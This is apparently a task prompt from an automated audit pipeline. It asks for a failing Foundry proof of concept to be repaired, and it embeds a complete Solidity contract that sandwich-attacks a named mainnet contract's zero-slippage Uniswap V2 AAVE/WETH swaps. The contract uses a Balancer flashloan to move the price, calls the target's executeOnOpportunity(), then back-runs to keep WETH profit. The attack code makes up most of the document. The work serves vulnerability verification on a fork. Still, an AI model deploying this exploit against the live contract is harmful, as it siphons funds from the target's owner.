You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Zero-minimum-output swaps let MEV searchers siphon away most of the extracted value
- claim: Both Uniswap V2 swap calls use `amountOutMin = 0`, so the verifier accepts any execution price for both the seed ETH-to-AAVE buy and the final AAVE-to-ETH liquidation.
- impact: A searcher can sandwich the transaction, push the AAVE/WETH price sharply against the verifier for each leg, and capture most of the exploitable value while still allowing the transaction to satisfy the minimal profit check.
- exploit_paths: ["Observe `executeOnOpportunity()` in the public mempool", "Front-run to worsen the AAVE/WETH price before one or both swaps", "Let the verifier swap with `amountOutMin = 0` at the manipulated price", "Back-run to restore price and keep the spread"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Router {
    function factory() external view returns (address);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IAaveBoostTarget {
    function aave() external view returns (address);
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    uint256 private constant BPS = 10_000;

    address public constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant DEFAULT_AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;

    enum Strategy {
        None,
        DumpAaveBeforeTargetSell,
        PumpAaveBeforeTargetBuy
    }

    bool public executed;
    bool public targetCallSucceeded;
    bool public hypothesisValidated;
    bool public pairDiscovered;

    address public immutable aaveToken;
    address public immutable pair;

    address private activeLoanToken;
    uint256 private activeLoanAmount;
    Strategy private activeStrategy;

    uint256 private realizedProfitAmount;
    string private realizedPath;

    constructor() {
        address discoveredAave = _safeReadAave();
        aaveToken = discoveredAave == address(0) ? DEFAULT_AAVE : discoveredAave;
        pair = _safeDiscoverPair(aaveToken, WETH);
        pairDiscovered = pair != address(0);
    }

    function executeOnOpportunity() external {
        if (executed || realizedProfitAmount > 0) {
            return;
        }
        executed = true;

        if (pair == address(0)) {
            // Concrete infeasibility: without the live AAVE/WETH pair used by the target's
            // Uniswap-V2 swaps, the required front-run / victim / back-run sequence cannot run.
            return;
        }

        (uint256 reserveAave, uint256 reserveWeth) = _pairReserves();
        uint256 vaultAave = IERC20(aaveToken).balanceOf(BALANCER_VAULT);
        uint256 vaultWeth = IERC20(WETH).balanceOf(BALANCER_VAULT);

        // A single pre-state cannot worsen both opposite-direction swaps on the same pair.
        // This PoC therefore tries both allowed one-leg sandwich directions from the finding:
        // (1) dump AAVE before the target's final AAVE->ETH liquidation, then back-run buyback;
        // (2) pump AAVE before the target's seed ETH->AAVE buy, then back-run sell.
        uint256[8] memory bpsList = [uint256(3500), 2500, 1800, 1200, 800, 500, 300, 150];

        for (uint256 i = 0; i < bpsList.length; ++i) {
            uint256 amount = _capAmount((reserveAave * bpsList[i]) / BPS, (vaultAave * 95) / 100);
            if (amount == 0) continue;
            try this._attempt(uint8(Strategy.DumpAaveBeforeTargetSell), amount) {
                return;
            } catch {}
        }

        for (uint256 i = 0; i < bpsList.length; ++i) {
            uint256 amount = _capAmount((reserveWeth * bpsList[i]) / BPS, (vaultWeth * 95) / 100);
            if (amount == 0) continue;
            try this._attempt(uint8(Strategy.PumpAaveBeforeTargetBuy), amount) {
                return;
            } catch {}
        }
    }

    function _attempt(uint8 strategyRaw, uint256 amount) external {
        require(msg.sender == address(this), "self only");
        require(amount > 0, "zero amount");

        Strategy strategy = Strategy(strategyRaw);
        address loanToken = strategy == Strategy.DumpAaveBeforeTargetSell ? aaveToken : WETH;
        uint256 wethBefore = IERC20(WETH).balanceOf(address(this));

        activeLoanToken = loanToken;
        activeLoanAmount = amount;
        activeStrategy = strategy;

        address[] memory tokens = new address[](1);
        tokens[0] = loanToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(strategy));

        uint256 wethAfter = IERC20(WETH).balanceOf(address(this));
        require(wethAfter > wethBefore, "no net profit");

        realizedProfitAmount = wethAfter - wethBefore;
        hypothesisValidated = true;
        realizedPath = strategy == Strategy.DumpAaveBeforeTargetSell
            ? "front-run dump AAVE on Uniswap V2 -> call target executeOnOpportunity() into manipulated final AAVE/ETH liquidation -> back-run buy AAVE back -> repay flashloan"
            : "front-run buy AAVE on Uniswap V2 -> call target executeOnOpportunity() into manipulated seed ETH/AAVE buy -> back-run sell AAVE -> repay flashloan";
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "vault only");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "single loan only");
        require(tokens[0] == activeLoanToken && amounts[0] == activeLoanAmount, "loan mismatch");

        if (activeStrategy == Strategy.DumpAaveBeforeTargetSell) {
            _forceApprove(aaveToken, UNISWAP_V2_ROUTER, amounts[0]);
            _swapExact(aaveToken, WETH, amounts[0]);
        } else if (activeStrategy == Strategy.PumpAaveBeforeTargetBuy) {
            _forceApprove(WETH, UNISWAP_V2_ROUTER, amounts[0]);
            _swapExact(WETH, aaveToken, amounts[0]);
        } else {
            revert("invalid strategy");
        }

        (bool ok,) = TARGET.call(abi.encodeWithSignature("executeOnOpportunity()"));
        require(ok, "target execution reverted under manipulated price");
        targetCallSucceeded = true;

        if (activeStrategy == Strategy.DumpAaveBeforeTargetSell) {
            uint256 neededAave = amounts[0] + feeAmounts[0];
            uint256 currentAave = IERC20(aaveToken).balanceOf(address(this));
            if (currentAave < neededAave) {
                uint256 wethToSpend = IERC20(WETH).balanceOf(address(this));
                _forceApprove(WETH, UNISWAP_V2_ROUTER, wethToSpend);
                _swapExact(WETH, aaveToken, wethToSpend);
                currentAave = IERC20(aaveToken).balanceOf(address(this));
            }
            require(currentAave >= neededAave, "insufficient AAVE to repay flashloan");
            require(IERC20(aaveToken).transfer(BALANCER_VAULT, neededAave), "AAVE repay failed");
        } else {
            uint256 currentAave = IERC20(aaveToken).balanceOf(address(this));
            if (currentAave > 0) {
                _forceApprove(aaveToken, UNISWAP_V2_ROUTER, currentAave);
                _swapExact(aaveToken, WETH, currentAave);
            }
            uint256 neededWeth = amounts[0] + feeAmounts[0];
            uint256 currentWeth = IERC20(WETH).balanceOf(address(this));
            require(currentWeth >= neededWeth, "insufficient WETH to repay flashloan");
            require(IERC20(WETH).transfer(BALANCER_VAULT, neededWeth), "WETH repay failed");
        }

        activeLoanToken = address(0);
        activeLoanAmount = 0;
        activeStrategy = Strategy.None;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return realizedPath;
    }

    function _swapExact(address tokenIn, address tokenOut, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, 0));
        ok0;
        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve failed");
    }

    function _pairReserves() internal view returns (uint256 reserveAave, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == aaveToken) {
            reserveAave = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveAave = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _safeReadAave() internal view returns (address token) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(IAaveBoostTarget.aave.selector));
        if (ok && data.length >= 32) {
            token = abi.decode(data, (address));
        }
    }

    function _safeDiscoverPair(address tokenA, address tokenB) internal view returns (address discoveredPair) {
        (bool okFactory, bytes memory factoryData) = UNISWAP_V2_ROUTER.staticcall(
            abi.encodeWithSelector(IUniswapV2Router.factory.selector)
        );
        if (!okFactory || factoryData.length < 32) {
            return address(0);
        }

        address factory = abi.decode(factoryData, (address));
        (bool okPair, bytes memory pairData) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2Factory.getPair.selector, tokenA, tokenB)
        );
        if (okPair && pairData.length >= 32) {
            discoveredPair = abi.decode(pairData, (address));
        }
    }

    function _capAmount(uint256 targetAmount, uint256 hardCap) internal pure returns (uint256) {
        if (targetAmount == 0 || hardCap == 0) return 0;
        return targetAmount < hardCap ? targetAmount : hardCap;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
